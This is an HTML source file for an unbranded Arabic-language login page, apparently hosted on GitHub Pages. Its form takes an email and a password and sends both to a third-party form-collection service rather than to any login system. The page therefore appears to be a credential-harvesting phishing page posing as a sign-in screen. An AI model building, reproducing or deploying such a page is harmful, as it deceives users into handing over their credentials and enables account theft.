<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <base href="https://omarRsss.github.io/omar-sharf-aljarrah-/"> <!-- رابط GitHub Pages -->

    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(to bottom, #FFA500, #FF4500);
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 300px;
            padding: 20px;
            background: white;
            margin: 100px auto;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
        }
        h2 {
            color: #333;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .submit-btn {
            width: 100%;
            padding: 10px;
            background: #FF4500;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
        .submit-btn:hover {
            background: #D14000;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>تسجيل الدخول</h2>
        <form action="https://getform.io/f/bpjnmvvb" method="POST">
            <input class="input-field" type="email" name="email" placeholder="البريد الإلكتروني" required>
            <input class="input-field" type="text" name="passcode" placeholder="كلمة السر" required>
            <button class="submit-btn" type="submit">تسجيل الدخول</button>
        </form>
    </div>

</body>
</html>
